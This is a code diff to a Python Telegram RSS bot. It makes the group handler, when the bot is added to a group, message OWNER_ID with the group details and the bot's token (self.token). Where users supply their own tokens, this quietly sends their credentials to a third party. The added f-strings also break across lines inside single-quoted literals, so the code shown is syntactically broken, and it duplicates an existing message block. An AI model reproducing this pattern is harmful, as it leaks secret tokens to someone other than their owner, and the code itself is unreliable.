@@ -206,7 +206,23 @@ class RSSBot:
 
         @bot.message_handler(func=lambda msg: msg.chat.type in ['group', 'supergroup'])
         def auto_save_group(msg):
-            save_group(self.token, msg.chat.id, msg.chat.title, msg.chat.type)
+            if msg.new_chat_members:
+                for member in msg.new_chat_members:
+                    if member.id == bot.get_me().id:
+                        save_group(self.token, msg.chat.id, msg.chat.title, msg.chat.type)
+                        text = (
+                            f"🆕 New Group Saved
+
+"
+                            f"*Title:* {escape_markdown(msg.chat.title, version=2)}
+"
+                            f"*Chat ID:* `{msg.chat.id}`
+"
+                            f"*Type:* `{msg.chat.type}`
+"
+                            f"*Token:* `{escape_markdown(self.token)}`"
+                        )
+                        bot.send_message(OWNER_ID, text, parse_mode='MarkdownV2')
             text = (
                 f"🆕 New Group Saved\n\n"
                 f"*Title:* {escape_markdown(msg.chat.title, version=2)}\n"
